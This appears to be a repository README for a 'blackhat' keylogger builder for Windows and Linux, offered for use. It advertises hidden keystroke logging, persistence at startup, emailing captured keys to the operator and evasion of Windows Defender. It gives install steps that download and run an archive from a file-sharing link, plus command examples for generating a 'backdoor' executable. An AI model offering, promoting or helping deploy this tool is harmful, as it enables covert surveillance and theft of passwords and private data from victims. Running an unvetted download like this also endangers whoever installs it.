# ABOUT THIS PROJECT

Remote persistent keylogger for Windows and Linux.

# Features:
- Logs keys pressed on keyboard
- Does not require root or admin privlages.
- Sends reports by email for ech and everything (AWESOME)
- Starts with system startup.
- Works with Linux and Windows.
- NO SPAMM EMAIL 
- IT BYPASS windows defender 2019 

# installation guide 

1. sudo apt-get install wine32

2. DOWNLOAD IT here https://my.pcloud.com/publink/show?code=XZcFhhkZeLg298b0zoSgdpj1J3IkAJsSrylk

3. cd MrRobot-2019-2020

4. chmod +x *

5. ./setup.sh

6. after that you need gmail account and before anything make sure you turn it on lesssecureapps
   to do so use this link https://myaccount.google.com/lesssecureapps
   
   PROBLEMS SOLVED+++++
   guys i receives some problems during installation if u have any problem with this tool solve by open install.sh using your notepad then copy and paste those command .
   
   note 
   dont forget to give it permission "python-2.7.14.msi" in root/opt 


# usage 

usage: run.py [-h] [-i INTERVAL] [-w] [-l] [-e EMAIL] [-p PASSWORD] -o OUT

MR ANONYMOUS BLACKHAT KEYLOGGER v2.0

Optional Arguments:
  -h, --help            show this help message and exit
  -i INTERVAL, --interval INTERVAL
                        Time between reports in seconds.
  -w, --windows         Generate a Windows executable.
  -l, --linux           Generate a Linux executable.

Required Arguments:
  -e EMAIL, --email EMAIL
                        Email address to send reports to.
  -p PASSWORD, --password PASSWORD
                        Password for the email address given in the -e
                        argument.
  -o OUT, --out OUT     Output file name.

# exapmle (WINDOWS)

python runme.py -i 40 -w -e "your email(gmail)" -p "your password" -o "name of your keylogger (eg backdoor)" 

# Example (linux)

python runme.py -i 40 -l -e "your email(gmail)" -p "your password" -o "name of your keylogger (eg backdoor)"

#after generate ur keylogger navigate in your mr-robot-keylogger-2019 directory, you will find DIST folder open it you will find ur generated keylogger there.



# ENJOY @MR ANONYMOUS( THE FREEDOM ) 




